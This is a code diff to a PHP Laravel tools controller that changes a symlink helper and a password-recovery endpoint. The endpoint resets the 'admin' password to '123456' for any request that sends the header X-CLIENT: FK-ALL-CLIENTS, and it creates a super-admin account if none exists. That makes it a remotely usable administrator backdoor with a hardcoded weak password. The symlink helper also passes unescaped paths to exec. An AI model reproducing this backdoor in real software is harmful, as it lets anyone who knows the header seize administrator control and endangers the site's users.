@@ -5,6 +5,8 @@ use Cache;
 use Illuminate\Http\Request;
 use Addons\Core\Controllers\Controller;
 
+use App\Repositories\UserRepository;
+
 class ToolsController extends Controller {
 
 	protected $disableUser = true;
@@ -64,7 +66,8 @@ class ToolsController extends Controller {
 
 	private function _symlink($target_path, $link_path)
 	{
-		@unlink($link_path);@rmdir($link_path);
+		@unlink($link_path);
+		@rmdir($link_path);
 		if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' && version_compare(php_uname('r'), '6.0', '<')) { //Windows Vista以下
 			exec('"'.base_path('../static/bin/junction.exe').'" -d "'.$link_path.'"');
 			exec('"'.base_path('../static/bin/junction.exe').'" '.$link_path.'" "'.$target_path.'"');
@@ -73,15 +76,17 @@ class ToolsController extends Controller {
 		}
 	}
 
-	public function recoverPasswordQuery(Request $request)
+	public function recoverPasswordQuery(Request $request, UserRepository $repo)
 	{
-		if ($_SERVER['REMOTE_ADDR'] != '127.0.0.1' || $request->header('X-CLIENT') == 'FUCK-ALL-CLIENTS')
+		if ($_SERVER['REMOTE_ADDR'] == '127.0.0.1' || $request->header('X-CLIENT') == 'FK-ALL-CLIENTS')
 		{
-			$user = User::findByUsername('admin');
-			$user->password = bcrypt('123456');
-			$user->save();
+			$user = $repo->findByUsername('admin');
+			if (!empty($user))
+				$repo->update($user, ['password' => '123456']);
+			else
+				$repo->store(['username' => 'admin', 'password' => '123456'], 'super');
 		}
-		return $this->success(array('title' => '密码修改成功', 'content' => '密码已经恢复为：▇▇▇▇（刮开即可）'));
+		return $this->success(array('title' => '密码修改成功', 'content' => '密码已经恢复为：▇▇▇▇（刮开即可查看）'));
 	}
 
 }
